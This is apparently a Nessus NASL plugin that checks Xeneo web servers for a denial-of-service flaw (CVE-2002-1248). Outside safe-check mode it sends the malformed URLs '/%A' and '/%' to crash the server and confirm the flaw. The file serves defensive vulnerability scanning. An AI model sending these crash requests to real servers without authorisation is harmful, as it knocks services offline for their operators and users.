#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public licence
#
# See also: Xeneo_Web_Server_2.2.9.0_DoS.nasl by Bekrar Chaouki
# I wrote this script at the same time. Although both flaws target the same
# web server, I think that we should keep them separated, because it might
# affect other servers.
#
# References:
# From: "Carsten H. Eiram" <che@secunia.com>
# Subject: Secunia Research: Xeneo Web Server URL Encoding Denial of Service
# To: VulnWatch <vulnwatch@vulnwatch.org>, 
#  Full Disclosure <full-disclosure@lists.netsys.com>, 
#  Bugtraq <bugtraq@securityfocus.com>
# Date: 23 Apr 2003 09:49:56 +0200
#
# From: "David Endler" <dendler@idefense.com>
# To: vulnwatch@vulnwatch.org
# Date: Mon, 4 Nov 2002 00:46:47 -0500
# Subject: iDEFENSE Security Advisory 11.04.02b: Denial of Service Vulnerability in Xeneo Web Server
# 

if(description)
{
 script_id(11546);
 script_bugtraq_id(6098);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2002-1248");
 
 name["english"] = "Xeneo web server %A DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to crash the remote 
Xeneo web server by requesting a malformed URL ending 
with /%A or /%

Solution :  upgrade your web server or use another
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes Xeneo web server with /%A or /%";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
  
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes", "no404.nasl", "http_version.nasl");
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
b = get_http_banner(port: port);
if ( "Xeneo/" >!< b ) exit(0);

if(safe_checks())
{
  # I got one banner: "Server: Xeneo/2.2"
  if (b =~ 'Server: *Xeneo/2\\.(([0-1][ \t\r\n.])|(2(\\.[0-9])?[ \t\r\n]))')
  {
    report = "
You are running an old version of Xeneo web server. 
It may be crashed by requesting an URL ending with /%A or /%

** Note that Nessus did not perform a real test and 
** just checked the version number in the banner

Solution : upgrade to Xeneo 2.2.10

Risk factor : High";
    security_hole(port: port, data: report);
  }
    
  exit(0);
}

if(http_is_dead(port:port))exit(0);
  
soc = http_open_socket(port);
if(! soc) exit(0);

items = make_list("/%A", "/%");

foreach i (items)
{
  data = http_get(item: i, port:port);
send(socket:soc, data:data);
r = http_recv(socket:soc);
http_close_socket(soc);
  if (http_is_dead(port:port))
  {
    security_hole(port);
    exit(0);
  }
  soc = http_open_socket(port);  # The server is supposed to be alive...
  if (!soc) exit(0);	# Network glitch? 
}
